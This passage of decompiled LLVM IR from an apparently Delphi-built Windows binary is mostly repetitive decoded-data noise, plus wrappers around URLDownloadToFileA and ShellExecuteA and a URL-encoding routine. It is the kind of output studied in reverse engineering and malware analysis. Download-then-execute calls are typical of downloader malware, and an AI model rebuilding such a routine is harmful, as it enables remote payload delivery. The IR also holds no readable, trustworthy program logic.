  %200 = add i8 %197, %199, !insn.addr !361
  %201 = inttoptr i32 %198 to i8*, !insn.addr !361
  store i8 %200, i8* %201, align 1, !insn.addr !361
  %202 = load i8, i8* %118, align 4, !insn.addr !362
  %203 = load i32, i32* %eax, align 4
  %204 = trunc i32 %203 to i8, !insn.addr !362
  %205 = add i8 %202, %204, !insn.addr !362
  %206 = inttoptr i32 %203 to i8*, !insn.addr !362
  store i8 %205, i8* %206, align 1, !insn.addr !362
  %207 = load i8, i8* %118, align 4, !insn.addr !363
  %208 = load i32, i32* %eax, align 4
  %209 = trunc i32 %208 to i8, !insn.addr !363
  %210 = add i8 %207, %209, !insn.addr !363
  %211 = inttoptr i32 %208 to i8*, !insn.addr !363
  store i8 %210, i8* %211, align 1, !insn.addr !363
  %212 = load i8, i8* %118, align 4, !insn.addr !364
  %213 = load i32, i32* %eax, align 4
  %214 = trunc i32 %213 to i8, !insn.addr !364
  %215 = add i8 %212, %214, !insn.addr !364
  %216 = inttoptr i32 %213 to i8*, !insn.addr !364
  store i8 %215, i8* %216, align 1, !insn.addr !364
  %217 = load i8, i8* %118, align 4, !insn.addr !365
  %218 = load i32, i32* %eax, align 4
  %219 = trunc i32 %218 to i8, !insn.addr !365
  %220 = add i8 %217, %219, !insn.addr !365
  %221 = inttoptr i32 %218 to i8*, !insn.addr !365
  store i8 %220, i8* %221, align 1, !insn.addr !365
  %222 = load i8, i8* %118, align 4, !insn.addr !366
  %223 = load i32, i32* %eax, align 4
  %224 = trunc i32 %223 to i8, !insn.addr !366
  %225 = add i8 %222, %224, !insn.addr !366
  %226 = inttoptr i32 %223 to i8*, !insn.addr !366
  store i8 %225, i8* %226, align 1, !insn.addr !366
  %227 = load i8, i8* %118, align 4, !insn.addr !367
  %228 = load i32, i32* %eax, align 4
  %229 = trunc i32 %228 to i8, !insn.addr !367
  %230 = add i8 %227, %229, !insn.addr !367
  %231 = inttoptr i32 %228 to i8*, !insn.addr !367
  store i8 %230, i8* %231, align 1, !insn.addr !367
  %232 = load i8, i8* %118, align 4, !insn.addr !368
  %233 = load i32, i32* %eax, align 4
  %234 = trunc i32 %233 to i8, !insn.addr !368
  %235 = add i8 %232, %234, !insn.addr !368
  %236 = inttoptr i32 %233 to i8*, !insn.addr !368
  store i8 %235, i8* %236, align 1, !insn.addr !368
  %237 = load i32, i32* %eax, align 4, !insn.addr !368
  ret i32 %237, !insn.addr !368

dec_label_pc_4048ce:                              ; preds = %dec_label_pc_40481b
  %238 = load i8, i8* %15, align 4, !insn.addr !369
  %239 = load i32, i32* %eax, align 4
  %240 = trunc i32 %239 to i8, !insn.addr !369
  %241 = add i8 %238, %240, !insn.addr !369
  %242 = inttoptr i32 %239 to i8*, !insn.addr !369
  store i8 %241, i8* %242, align 1, !insn.addr !369
  %243 = load i8, i8* %15, align 4, !insn.addr !370
  %244 = load i32, i32* %eax, align 4
  %245 = trunc i32 %244 to i8, !insn.addr !370
  %246 = add i8 %243, %245, !insn.addr !370
  %247 = inttoptr i32 %244 to i8*, !insn.addr !370
  store i8 %246, i8* %247, align 1, !insn.addr !370
  %248 = load i8, i8* %15, align 4, !insn.addr !371
  %249 = load i32, i32* %eax, align 4
  %250 = trunc i32 %249 to i8, !insn.addr !371
  %251 = add i8 %248, %250, !insn.addr !371
  %252 = inttoptr i32 %249 to i8*, !insn.addr !371
  store i8 %251, i8* %252, align 1, !insn.addr !371
  %253 = load i8, i8* %15, align 4, !insn.addr !372
  %254 = load i32, i32* %eax, align 4
  %255 = trunc i32 %254 to i8, !insn.addr !372
  %256 = add i8 %253, %255, !insn.addr !372
  %257 = inttoptr i32 %254 to i8*, !insn.addr !372
  store i8 %256, i8* %257, align 1, !insn.addr !372
  %258 = load i8, i8* %15, align 4, !insn.addr !373
  %259 = load i32, i32* %eax, align 4
  %260 = trunc i32 %259 to i8, !insn.addr !373
  %261 = add i8 %258, %260, !insn.addr !373
  %262 = inttoptr i32 %259 to i8*, !insn.addr !373
  store i8 %261, i8* %262, align 1, !insn.addr !373
  %263 = load i8, i8* %15, align 4, !insn.addr !374
  %264 = load i32, i32* %eax, align 4
  %265 = trunc i32 %264 to i8, !insn.addr !374
  %266 = add i8 %263, %265, !insn.addr !374
  %267 = inttoptr i32 %264 to i8*, !insn.addr !374
  store i8 %266, i8* %267, align 1, !insn.addr !374
  %268 = load i8, i8* %15, align 4, !insn.addr !375
  %269 = load i32, i32* %eax, align 4
  %270 = trunc i32 %269 to i8, !insn.addr !375
  %271 = add i8 %268, %270, !insn.addr !375
  %272 = icmp ult i8 %271, %268, !insn.addr !375
  %273 = inttoptr i32 %269 to i8*, !insn.addr !375
  store i8 %271, i8* %273, align 1, !insn.addr !375
  br i1 %272, label %dec_label_pc_404956, label %dec_label_pc_4048de, !insn.addr !376

dec_label_pc_4048de:                              ; preds = %dec_label_pc_4048ce
  %274 = load i32, i32* %eax, align 4
  %275 = xor i32 %274, 54, !insn.addr !377
  %276 = inttoptr i32 %275 to i8*, !insn.addr !378
  %277 = load i8, i8* %276, align 1, !insn.addr !378
  %278 = trunc i32 %275 to i8, !insn.addr !378
  %factor = mul i8 %278, 24
  %279 = add i8 %factor, %277, !insn.addr !379
  store i8 %279, i8* %276, align 1, !insn.addr !379
  ret i32 %275, !insn.addr !379

dec_label_pc_404916:                              ; preds = %dec_label_pc_404891
  %280 = icmp eq i8 %170, 0, !insn.addr !380
  %281 = inttoptr i32 %168 to i8*, !insn.addr !380
  store i8 %170, i8* %281, align 1, !insn.addr !380
  store i8* %118, i8** %.pre-phi.reg2mem, !insn.addr !381
  br i1 %280, label %dec_label_pc_404990, label %dec_label_pc_404995, !insn.addr !381

dec_label_pc_404956:                              ; preds = %dec_label_pc_4048ce
  %282 = load i8, i8* %15, align 4, !insn.addr !382
  %283 = load i32, i32* %eax, align 4
  %284 = trunc i32 %283 to i8, !insn.addr !382
  %285 = add i8 %282, %284, !insn.addr !382
  %286 = inttoptr i32 %283 to i8*, !insn.addr !382
  store i8 %285, i8* %286, align 1, !insn.addr !382
  %287 = load i8, i8* %15, align 4, !insn.addr !383
  %288 = load i32, i32* %eax, align 4
  %289 = trunc i32 %288 to i8, !insn.addr !383
  %290 = add i8 %287, %289, !insn.addr !383
  %291 = inttoptr i32 %288 to i8*, !insn.addr !383
  store i8 %290, i8* %291, align 1, !insn.addr !383
  %292 = load i8, i8* %15, align 4, !insn.addr !384
  %293 = load i32, i32* %eax, align 4
  %294 = trunc i32 %293 to i8, !insn.addr !384
  %295 = add i8 %292, %294, !insn.addr !384
  %296 = inttoptr i32 %293 to i8*, !insn.addr !384
  store i8 %295, i8* %296, align 1, !insn.addr !384
  %297 = load i8, i8* %15, align 4, !insn.addr !385
  %298 = load i32, i32* %eax, align 4
  %299 = trunc i32 %298 to i8, !insn.addr !385
  %300 = add i8 %297, %299, !insn.addr !385
  %301 = inttoptr i32 %298 to i8*, !insn.addr !385
  store i8 %300, i8* %301, align 1, !insn.addr !385
  %302 = load i8, i8* %15, align 4, !insn.addr !386
  %303 = load i32, i32* %eax, align 4
  %304 = trunc i32 %303 to i8, !insn.addr !386
  %305 = add i8 %302, %304, !insn.addr !386
  %306 = inttoptr i32 %303 to i8*, !insn.addr !386
  store i8 %305, i8* %306, align 1, !insn.addr !386
  %307 = load i8, i8* %15, align 4, !insn.addr !387
  %308 = load i32, i32* %eax, align 4
  %309 = trunc i32 %308 to i8, !insn.addr !387
  %310 = add i8 %307, %309, !insn.addr !387
  %311 = inttoptr i32 %308 to i8*, !insn.addr !387
  store i8 %310, i8* %311, align 1, !insn.addr !387
  %312 = load i8, i8* %15, align 4, !insn.addr !388
  %313 = load i32, i32* %eax, align 4
  %314 = trunc i32 %313 to i8, !insn.addr !388
  %315 = add i8 %312, %314, !insn.addr !388
  %316 = icmp slt i8 %315, 0, !insn.addr !388
  %317 = inttoptr i32 %313 to i8*, !insn.addr !388
  store i8 %315, i8* %317, align 1, !insn.addr !388
  br i1 %316, label %dec_label_pc_4049e5, label %dec_label_pc_40496f, !insn.addr !389

dec_label_pc_40496f:                              ; preds = %dec_label_pc_404956
  %318 = load i8, i8* %15, align 4, !insn.addr !390
  %319 = load i32, i32* %eax, align 4
  %320 = trunc i32 %319 to i8, !insn.addr !390
  %321 = add i8 %318, %320, !insn.addr !390
  %322 = inttoptr i32 %319 to i8*, !insn.addr !390
  store i8 %321, i8* %322, align 1, !insn.addr !390
  %323 = load i8, i8* %15, align 4, !insn.addr !391
  %324 = load i32, i32* %eax, align 4
  %325 = trunc i32 %324 to i8, !insn.addr !391
  %326 = add i8 %323, %325, !insn.addr !391
  %327 = inttoptr i32 %324 to i8*, !insn.addr !391
  store i8 %326, i8* %327, align 1, !insn.addr !391
  %328 = load i8, i8* %15, align 4, !insn.addr !392
  %329 = load i32, i32* %eax, align 4
  %330 = trunc i32 %329 to i8, !insn.addr !392
  %331 = add i8 %328, %330, !insn.addr !392
  %332 = inttoptr i32 %329 to i8*, !insn.addr !392
  store i8 %331, i8* %332, align 1, !insn.addr !392
  %333 = load i8, i8* %15, align 4, !insn.addr !393
  %334 = load i32, i32* %eax, align 4
  %335 = trunc i32 %334 to i8, !insn.addr !393
  %336 = add i8 %333, %335, !insn.addr !393
  %337 = inttoptr i32 %334 to i8*, !insn.addr !393
  store i8 %336, i8* %337, align 1, !insn.addr !393
  %338 = load i8, i8* %15, align 4, !insn.addr !394
  %339 = load i32, i32* %eax, align 4
  %340 = trunc i32 %339 to i8, !insn.addr !394
  %341 = add i8 %338, %340, !insn.addr !394
  %342 = inttoptr i32 %339 to i8*, !insn.addr !394
  store i8 %341, i8* %342, align 1, !insn.addr !394
  %343 = load i8, i8* %15, align 4, !insn.addr !395
  %344 = load i32, i32* %eax, align 4
  %345 = trunc i32 %344 to i8, !insn.addr !395
  %346 = add i8 %343, %345, !insn.addr !395
  %347 = inttoptr i32 %344 to i8*, !insn.addr !395
  store i8 %346, i8* %347, align 1, !insn.addr !395
  %348 = load i8, i8* %15, align 4, !insn.addr !396
  %349 = load i32, i32* %eax, align 4
  %350 = trunc i32 %349 to i8, !insn.addr !396
  %351 = add i8 %348, %350, !insn.addr !396
  %352 = inttoptr i32 %349 to i8*, !insn.addr !396
  store i8 %351, i8* %352, align 1, !insn.addr !396
  %353 = load i8, i8* %15, align 4, !insn.addr !397
  %354 = load i32, i32* %eax, align 4
  %355 = trunc i32 %354 to i8, !insn.addr !397
  %356 = add i8 %353, %355, !insn.addr !397
  %357 = inttoptr i32 %354 to i8*, !insn.addr !397
  store i8 %356, i8* %357, align 1, !insn.addr !397
  %358 = load i8, i8* %15, align 4, !insn.addr !398
  %359 = load i32, i32* %eax, align 4
  %360 = trunc i32 %359 to i8, !insn.addr !398
  %361 = add i8 %358, %360, !insn.addr !398
  %362 = inttoptr i32 %359 to i8*, !insn.addr !398
  store i8 %361, i8* %362, align 1, !insn.addr !398
  store i8* %15, i8** %.pre-phi.reg2mem, !insn.addr !398
  br label %dec_label_pc_404990, !insn.addr !398

dec_label_pc_404990:                              ; preds = %dec_label_pc_40496f, %dec_label_pc_404916
  %.pre-phi.reload = load i8*, i8** %.pre-phi.reg2mem
  %363 = load i8, i8* %.pre-phi.reload, align 4, !insn.addr !399
  %364 = load i32, i32* %eax, align 4
  %365 = trunc i32 %364 to i8, !insn.addr !399
  %366 = add i8 %363, %365, !insn.addr !399
  %367 = inttoptr i32 %364 to i8*, !insn.addr !399
  store i8 %366, i8* %367, align 1, !insn.addr !399
  %368 = load i8, i8* %.pre-phi.reload, align 4, !insn.addr !400
  %369 = load i32, i32* %eax, align 4
  %370 = trunc i32 %369 to i8, !insn.addr !400
  %371 = add i8 %368, %370, !insn.addr !400
  %372 = inttoptr i32 %369 to i8*, !insn.addr !400
  store i8 %371, i8* %372, align 1, !insn.addr !400
  %373 = load i32, i32* %eax, align 4, !insn.addr !400
  ret i32 %373, !insn.addr !400

dec_label_pc_404995:                              ; preds = %dec_label_pc_404916
  %374 = load i8, i8* %118, align 4, !insn.addr !401
  %375 = load i32, i32* %eax, align 4
  %376 = trunc i32 %375 to i8, !insn.addr !401
  %377 = add i8 %374, %376, !insn.addr !401
  %378 = inttoptr i32 %375 to i8*, !insn.addr !401
  store i8 %377, i8* %378, align 1, !insn.addr !401
  %379 = load i8, i8* %118, align 4, !insn.addr !402
  %380 = load i32, i32* %eax, align 4
  %381 = trunc i32 %380 to i8, !insn.addr !402
  %382 = add i8 %379, %381, !insn.addr !402
  %383 = inttoptr i32 %380 to i8*, !insn.addr !402
  store i8 %382, i8* %383, align 1, !insn.addr !402
  %384 = load i32, i32* %eax, align 4, !insn.addr !402
  ret i32 %384, !insn.addr !402

dec_label_pc_4049e5:                              ; preds = %dec_label_pc_404956
  %385 = load i32, i32* %eax, align 4, !insn.addr !403
  %386 = call i32 @__readfsdword(i32 %385), !insn.addr !403
  store i32 %386, i32* %stack_var_-12, align 4, !insn.addr !403
  %387 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !403
  %388 = load i32, i32* %eax, align 4, !insn.addr !404
  call void @__writefsdword(i32 %388, i32 %387), !insn.addr !404
  %389 = load i32, i32* @global_var_40a68c, align 4, !insn.addr !405
  %390 = add i32 %389, 1, !insn.addr !405
  store i32 %390, i32* @global_var_40a68c, align 4, !insn.addr !405
  %391 = load i32, i32* %stack_var_-12, align 4, !insn.addr !406
  call void @__writefsdword(i32 0, i32 %391), !insn.addr !407
  ret i32 0, !insn.addr !408
}

define i32 @function_404a05() local_unnamed_addr {
dec_label_pc_404a05:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !409
  ret i32 %0, !insn.addr !409
}

define i32 @function_404a0a() local_unnamed_addr {
dec_label_pc_404a0a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !410
}

define i32 @function_404a0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a0c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !411
}

define i32 @function_404a10() local_unnamed_addr {
dec_label_pc_404a10:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40a68c, align 4, !insn.addr !412
  %2 = add i32 %1, -1, !insn.addr !412
  store i32 %2, i32* @global_var_40a68c, align 4, !insn.addr !412
  ret i32 %0, !insn.addr !413
}

define i32* @function_404a18(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd) local_unnamed_addr {
dec_label_pc_404a18:
  %0 = call i32* @ShellExecuteA(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd), !insn.addr !414
  ret i32* %0, !insn.addr !414
}

define i32 @function_404a20() local_unnamed_addr {
dec_label_pc_404a20:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !415
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !415
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !415
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !416
  %2 = load i32, i32* @global_var_40a690, align 4, !insn.addr !417
  %3 = add i32 %2, 1, !insn.addr !417
  store i32 %3, i32* @global_var_40a690, align 4, !insn.addr !417
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !418
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !419
  ret i32 0, !insn.addr !420
}

define i32 @function_404a45() local_unnamed_addr {
dec_label_pc_404a45:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !421
  ret i32 %0, !insn.addr !421
}

define i32 @function_404a4a() local_unnamed_addr {
dec_label_pc_404a4a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !422
}

define i32 @function_404a4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a4c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !423
}

define i32 @function_404a50() local_unnamed_addr {
dec_label_pc_404a50:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40a690, align 4, !insn.addr !424
  %2 = add i32 %1, -1, !insn.addr !424
  store i32 %2, i32* @global_var_40a690, align 4, !insn.addr !424
  ret i32 %0, !insn.addr !425
}

define i32 @function_404a58() local_unnamed_addr {
dec_label_pc_404a58:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !426
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !426
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !426
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !427
  %2 = load i32, i32* @global_var_40a694, align 4, !insn.addr !428
  %3 = add i32 %2, 1, !insn.addr !428
  store i32 %3, i32* @global_var_40a694, align 4, !insn.addr !428
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !429
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !430
  ret i32 0, !insn.addr !431
}

define i32 @function_404a7d() local_unnamed_addr {
dec_label_pc_404a7d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !432
  ret i32 %0, !insn.addr !432
}

define i32 @function_404a82() local_unnamed_addr {
dec_label_pc_404a82:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !433
}

define i32 @function_404a84(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a84:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !434
}

define i32 @function_404a88() local_unnamed_addr {
dec_label_pc_404a88:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40a694, align 4, !insn.addr !435
  %2 = add i32 %1, -1, !insn.addr !435
  store i32 %2, i32* @global_var_40a694, align 4, !insn.addr !435
  ret i32 %0, !insn.addr !436
}

define i32 @function_404a90() local_unnamed_addr {
dec_label_pc_404a90:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !437
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !437
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !437
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !438
  %2 = load i32, i32* @global_var_40a698, align 4, !insn.addr !439
  %3 = add i32 %2, 1, !insn.addr !439
  store i32 %3, i32* @global_var_40a698, align 4, !insn.addr !439
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !440
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !441
  ret i32 0, !insn.addr !442
}

define i32 @function_404ab5() local_unnamed_addr {
dec_label_pc_404ab5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !443
  ret i32 %0, !insn.addr !443
}

define i32 @function_404aba() local_unnamed_addr {
dec_label_pc_404aba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !444
}

define i32 @function_404abc(i32 %arg1) local_unnamed_addr {
dec_label_pc_404abc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !445
}

define i32 @function_404ac0() local_unnamed_addr {
dec_label_pc_404ac0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40a698, align 4, !insn.addr !446
  %2 = add i32 %1, -1, !insn.addr !446
  store i32 %2, i32* @global_var_40a698, align 4, !insn.addr !446
  ret i32 %0, !insn.addr !447
}

define i32 @function_404ac8(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5) local_unnamed_addr {
dec_label_pc_404ac8:
  %0 = call i32 @URLDownloadToFileA(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5), !insn.addr !448
  ret i32 %0, !insn.addr !448
}

define i32 @function_404ad0() local_unnamed_addr {
dec_label_pc_404ad0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !449
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !449
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !449
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !450
  %2 = load i32, i32* @global_var_40a69c, align 4, !insn.addr !451
  %3 = add i32 %2, 1, !insn.addr !451
  store i32 %3, i32* @global_var_40a69c, align 4, !insn.addr !451
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !452
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !453
  ret i32 0, !insn.addr !454
}

define i32 @function_404af5() local_unnamed_addr {
dec_label_pc_404af5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !455
  ret i32 %0, !insn.addr !455
}

define i32 @function_404afa() local_unnamed_addr {
dec_label_pc_404afa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !456
}

define i32 @function_404afc(i32 %arg1) local_unnamed_addr {
dec_label_pc_404afc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !457
}

define i32 @function_404b00() local_unnamed_addr {
dec_label_pc_404b00:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40a69c, align 4, !insn.addr !458
  %2 = add i32 %1, -1, !insn.addr !458
  store i32 %2, i32* @global_var_40a69c, align 4, !insn.addr !458
  ret i32 %0, !insn.addr !459
}

define i32 @function_404b08() local_unnamed_addr {
dec_label_pc_404b08:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !460
  %2 = icmp ult i8 %1, 10
  %3 = and i32 %0, 255
  br i1 %2, label %dec_label_pc_404b0c, label %dec_label_pc_404b15, !insn.addr !461

dec_label_pc_404b0c:                              ; preds = %dec_label_pc_404b08
  %4 = add nuw nsw i32 %3, 48, !insn.addr !462
  ret i32 %4, !insn.addr !463

dec_label_pc_404b15:                              ; preds = %dec_label_pc_404b08
  %5 = add nuw nsw i32 %3, 55, !insn.addr !464
  ret i32 %5, !insn.addr !465
}

define i32 @function_404b20() local_unnamed_addr {
dec_label_pc_404b20:
  %esp.2.reg2mem = alloca i32, !insn.addr !466
  %esp.1.reg2mem = alloca i32, !insn.addr !466
  %cf.0.reg2mem = alloca i1, !insn.addr !466
  %esi.0.reg2mem = alloca i32, !insn.addr !466
  %esp.0.reg2mem = alloca i32, !insn.addr !466
  %ebx.0.reg2mem = alloca i32, !insn.addr !466
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !467
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !468
  store i32 %2, i32* %stack_var_-52, align 4, !insn.addr !468
  %3 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !468
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !469
  %4 = call i32 @"@LStrClr"(), !insn.addr !470
  %5 = call i32 @function_4034c8(), !insn.addr !471
  %6 = icmp slt i32 %5, 1
  store i32 %3, i32* %esp.2.reg2mem, !insn.addr !472
  br i1 %6, label %dec_label_pc_404c21, label %dec_label_pc_404b6d.preheader, !insn.addr !472

dec_label_pc_404b6d.preheader:                    ; preds = %dec_label_pc_404b20
  %7 = add i32 %0, -1, !insn.addr !473
  store i32 1, i32* %ebx.0.reg2mem
  store i32 %3, i32* %esp.0.reg2mem
  store i32 %5, i32* %esi.0.reg2mem
  br label %dec_label_pc_404b6d

dec_label_pc_404b6d:                              ; preds = %dec_label_pc_404b6d.preheader, %dec_label_pc_404c19
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %7, %ebx.0.reload, !insn.addr !473
  %9 = inttoptr i32 %8 to i8*, !insn.addr !473
  %10 = load i8, i8* %9, align 1, !insn.addr !473
  %11 = icmp eq i8 %10, 32, !insn.addr !473
  %12 = icmp eq i1 %11, false, !insn.addr !474
  br i1 %12, label %dec_label_pc_404b88, label %dec_label_pc_404b77, !insn.addr !474

dec_label_pc_404b77:                              ; preds = %dec_label_pc_404b6d
  %13 = call i32 @"@LStrCat"(), !insn.addr !475
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !476
  br label %dec_label_pc_404c19, !insn.addr !476

dec_label_pc_404b88:                              ; preds = %dec_label_pc_404b6d
  %14 = icmp ult i8 %10, 32, !insn.addr !477
  br i1 %14, label %dec_label_pc_404bab, label %dec_label_pc_404b92, !insn.addr !478

dec_label_pc_404b92:                              ; preds = %dec_label_pc_404b88
  %15 = add i8 %10, -32, !insn.addr !479
  %16 = icmp ult i8 %15, 95, !insn.addr !480
  %17 = icmp ult i8 %15, 96
  store i1 %16, i1* %cf.0.reg2mem, !insn.addr !481
  br i1 %17, label %dec_label_pc_404b9f, label %dec_label_pc_404ba9, !insn.addr !481

dec_label_pc_404b9f:                              ; preds = %dec_label_pc_404b92
  %18 = load i32, i32* inttoptr (i32 4213856 to i32*), align 32, !insn.addr !482
  %19 = and i8 %15, 31
  %20 = zext i8 %19 to i32, !insn.addr !482
  %21 = shl i32 1, %20, !insn.addr !482
  %22 = and i32 %18, %21, !insn.addr !482
  %23 = icmp ne i32 %22, 0, !insn.addr !482
  store i1 %23, i1* %cf.0.reg2mem, !insn.addr !482
  br label %dec_label_pc_404ba9, !insn.addr !482

dec_label_pc_404ba9:                              ; preds = %dec_label_pc_404b92, %dec_label_pc_404b9f
  %cf.0.reload = load i1, i1* %cf.0.reg2mem
  %24 = icmp eq i1 %cf.0.reload, false, !insn.addr !483
  br i1 %24, label %dec_label_pc_404c00, label %dec_label_pc_404bab, !insn.addr !483

dec_label_pc_404bab:                              ; preds = %dec_label_pc_404ba9, %dec_label_pc_404b88
  %25 = and i8 %10, 15
  %26 = zext i8 %25 to i32, !insn.addr !484
  %27 = add i32 %esp.0.reload, -4, !insn.addr !485
  %28 = inttoptr i32 %27 to i32*, !insn.addr !485
  store i32 %26, i32* %28, align 4, !insn.addr !485
  %29 = add i32 %esp.0.reload, -8, !insn.addr !486
  %30 = inttoptr i32 %29 to i32*, !insn.addr !486
  store i32 ptrtoint (i32* @global_var_404c74 to i32), i32* %30, align 4, !insn.addr !486
  %31 = call i32 @function_404b08(), !insn.addr !487
  %32 = call i32 @"@LStrFromChar"(), !insn.addr !488
  %33 = add i32 %esp.0.reload, -12, !insn.addr !489
  %34 = inttoptr i32 %33 to i32*, !insn.addr !489
  store i32 0, i32* %34, align 4, !insn.addr !489
  %35 = call i32 @function_404b08(), !insn.addr !490
  %36 = call i32 @"@LStrFromChar"(), !insn.addr !491
  %37 = add i32 %esp.0.reload, -16, !insn.addr !492
  %38 = inttoptr i32 %37 to i32*, !insn.addr !492
  store i32 0, i32* %38, align 4, !insn.addr !492
  %39 = call i32 @"@LStrCatN"(), !insn.addr !493
  store i32 %37, i32* %esp.1.reg2mem, !insn.addr !494
  br label %dec_label_pc_404c19, !insn.addr !494

dec_label_pc_404c00:                              ; preds = %dec_label_pc_404ba9
  %40 = call i32 @"@LStrFromChar"(), !insn.addr !495
  %41 = call i32 @"@LStrCat"(), !insn.addr !496
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !496
  br label %dec_label_pc_404c19, !insn.addr !496

dec_label_pc_404c19:                              ; preds = %dec_label_pc_404c00, %dec_label_pc_404bab, %dec_label_pc_404b77
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %42 = add i32 %ebx.0.reload, 1, !insn.addr !497
  %43 = add i32 %esi.0.reload, -1, !insn.addr !498
  %44 = icmp eq i32 %43, 0, !insn.addr !498
  %45 = icmp eq i1 %44, false, !insn.addr !499
  store i32 %42, i32* %ebx.0.reg2mem, !insn.addr !499
  store i32 %esp.1.reload, i32* %esp.0.reg2mem, !insn.addr !499
  store i32 %43, i32* %esi.0.reg2mem, !insn.addr !499
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !499
  br i1 %45, label %dec_label_pc_404b6d, label %dec_label_pc_404c21, !insn.addr !499

dec_label_pc_404c21:                              ; preds = %dec_label_pc_404c19, %dec_label_pc_404b20
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %46 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !500
  %47 = load i32, i32* %46, align 4, !insn.addr !500
  call void @__writefsdword(i32 0, i32 %47), !insn.addr !501
  %48 = add i32 %esp.2.reload, 8, !insn.addr !502
  %49 = inttoptr i32 %48 to i32*, !insn.addr !502
  store i32 4213835, i32* %49, align 4, !insn.addr !502
  %50 = call i32 @"@LStrArrayClr"(), !insn.addr !503
  %51 = call i32 @"@LStrClr"(), !insn.addr !504
  ret i32 %51, !insn.addr !505
}

define i32 @function_404c44() local_unnamed_addr {
dec_label_pc_404c44:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !506
  ret i32 %0, !insn.addr !506
}

define i32 @function_404c49() local_unnamed_addr {
dec_label_pc_404c49:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !507
}

define i32 @function_404c4b(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404c4b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !508
}

define i32 @function_404c6f() local_unnamed_addr {
dec_label_pc_404c6f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !509
  %2 = inttoptr i32 %0 to i32*, !insn.addr !509
  store i32 %1, i32* %2, align 4, !insn.addr !509
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !510
  %5 = load i32, i32* %eax, align 4
